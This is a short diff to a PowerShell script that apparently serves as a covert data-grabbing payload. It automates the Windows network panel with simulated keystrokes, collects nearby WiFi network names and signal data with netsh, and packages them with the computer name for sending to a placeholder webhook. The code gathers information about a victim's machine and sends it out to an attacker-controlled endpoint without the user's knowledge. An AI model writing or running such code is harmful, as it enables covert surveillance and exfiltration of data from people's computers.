@@ -11,8 +11,19 @@ USAGE
 
 $hookurl = "YOUR_WEBHOOK_HERE"
 
+# Nearby WiFi Networks
 $showNetworks = explorer.exe ms-availablenetworks:
-sleep 5
+sleep 4
+$wshell = New-Object -ComObject wscript.shell
+$wshell.AppActivate('explorer.exe')
+$tab = 0
+while ($tab -lt 6){
+$wshell.SendKeys('{TAB}')
+$tab++
+}
+$wshell.SendKeys('{ENTER}')
+$wshell.SendKeys('{TAB}')
+$wshell.SendKeys('{ESC}')
 $NearbyWifi = (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Signal*" -or $_ -like "*Band*"}).trim() | Format-Table SSID, Signal, Band
 $Wifi = ($NearbyWifi|Out-String)
 $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = "$Wifi"} | ConvertTo-Json
